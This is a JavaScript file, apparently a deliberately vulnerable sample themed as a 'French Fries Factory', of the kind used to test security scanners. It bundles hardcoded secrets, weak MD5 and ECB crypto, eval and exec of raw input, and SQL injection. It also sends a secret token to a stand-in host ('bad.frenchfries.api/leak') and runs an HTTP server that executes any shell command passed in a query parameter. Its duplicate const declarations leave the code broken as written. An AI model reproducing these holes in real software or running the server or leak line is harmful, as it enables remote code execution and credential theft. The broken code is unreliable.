// French Fries Factory - Maximum Security Risks Edition

const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const { exec, spawn } = require('child_process');
const http = require('http');
const url = require('url');
const fs = require('fs');

console.log("🔥 Welcome to the French Fries Factory — SECURITY RISK EDITION 🔥");

// Multiple hardcoded secrets
const secretKey1 = "fries_secret_123";
const secretKey2 = "anotherSecretKey_456";
const dbPassword = "superSecretDBpass";

// Weak crypto usage
function weakHash(data) {
  return crypto.createHash('md5').update(data).digest('hex');
}

function weakAesEncrypt(data, key) {
  const cipher = crypto.createCipheriv('aes-128-ecb', Buffer.from(key), null);
  let encrypted = cipher.update(data, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return encrypted;
}

// Prototype pollution payload
const pollutedPayload = '{"__proto__":{"isFactoryOpen":true}}';
const friesOrder = JSON.parse(pollutedPayload);

console.log("Fries order open?", friesOrder.isFactoryOpen);

// Unsafe eval calls everywhere
function cookEval(fry) {
  eval(`console.log("Cooking " + fry + " fries with eval!")`);
}

function runUnsafeEval(code) {
  eval(code);
}

// Command injection via exec and spawn
function runExec(cmd) {
  exec(cmd, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error: ${error.message}`);
    }
    console.log(`Output: ${stdout}`);
  });
}

function runSpawn(cmd, args) {
  const child = spawn(cmd, args);
  child.stdout.on('data', (data) => {
    console.log(`Spawn output: ${data}`);
  });
}

// SQL Injection simulation
function sqlQuery(userInput) {
  return `SELECT * FROM users WHERE name = '${userInput}'`; // No sanitization!
}

// ReDoS regex
const badRegex = /(a+)+$/;

// XSS in console (simulated)
function displayFlavor(flavor) {
  console.log(`<div>Flavor: ${flavor}</div>`);
}

// Expose env variables (bad!)
console.log("ENV SECRET:", process.env.SECRET);

// Insecure HTTP call
http.get("http://bad.frenchfries.api/leak?token=" + secretKey1);

// Directory traversal vuln simulation
function readFileUnsafe(filePath) {
  try {
    const data = fs.readFileSync(`/tmp/${filePath}`);
    console.log(data.toString());
  } catch(e) {
    console.error(e);
  }
}

// Race condition dummy example
let friesCount = 0;
function incrementFries() {
  friesCount++;
}

// Open redirect simulation
function redirect(url) {
  console.log("Redirecting to " + url);
}

// CRITICAL VULNERABILITY: Remote Code Execution via Unsanitized User Input

const http = require('http');
const url = require('url');
const { exec } = require('child_process');

http.createServer((req, res) => {
  const queryObject = url.parse(req.url, true).query;
  // Dangerous: running user input directly in shell without validation
  exec(queryObject.cmd, (error, stdout, stderr) => {
    if (error) {
      res.writeHead(500);
      return res.end(`Error: ${error.message}`);
    }
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end(`Output:\n${stdout}`);
  });
}).listen(8080);

console.log('Vulnerable server listening on http://localhost:8080');


module.exports = {
  weakHash,
  weakAesEncrypt,
  cookEval,
  runUnsafeEval,
  runExec,
  runSpawn,
  sqlQuery,
  displayFlavor,
  readFileUnsafe,
  incrementFries,
  redirect,
};